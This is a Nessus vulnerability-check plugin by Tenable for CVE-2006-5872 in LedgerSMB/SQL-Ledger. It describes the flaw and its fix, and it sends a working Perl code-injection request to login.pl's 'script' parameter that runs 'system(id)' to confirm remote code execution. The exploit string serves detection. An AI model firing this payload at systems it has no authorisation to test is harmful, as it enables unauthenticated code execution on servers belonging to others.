#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(24262);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2006-5872");
  script_bugtraq_id(21634);
  script_osvdb_id(28754);

  script_name(english:"LedgerSMB / SQL-Ledger login.pl script Parameter Arbitrary Perl Code Execution");
  script_summary(english:"Tries to run a command via LedgerSMB/SQL-Ledger login.pl");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Perl application that allows
arbitrary command execution." );
 script_set_attribute(attribute:"description", value:
"The remote host is running LedgerSMB or SQL-Ledger, a web-based,
double-entry accounting system.

The version of LedgerSMB or SQL-Ledger on the remote host fails to
sanitize user-supplied input to the 'script' parameter of the
'login.pl' script before using it to execute Perl code.  An
unauthenticated attacker could leverage this issue to execute
arbitrary code on the remote host subject to the privileges of the
web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/458300/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to LedgerSMB 1.1.5 / SQL-Ledger 2.6.21 or later as those
versions reportedly address the issue." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/01/30");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/09/11");
 script_cvs_date("$Date: 2014/05/05 21:37:03 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe",value:"cpe:/a:dws_systems_inc.:sql-ledger");
 script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2014 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);

# Loop through directories.
if (thorough_tests) extra_dirs = make_list("/ledger", "/sql-ledger", "/ledger-smb", "/ledgersmb");
else extra_dirs = make_list();

exploit = string(
  "/login.pl?",
  "login=", SCRIPT_NAME, "&",
  "script=", urlencode(str:'-e print "Content-Type: text/plain\r\n\r\n";system(id)'), "&",
  "action=logout"
);

http_check_remote_code(
  extra_dirs:extra_dirs,
  check_request:exploit,
  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
  command:"id",
  port:port
);
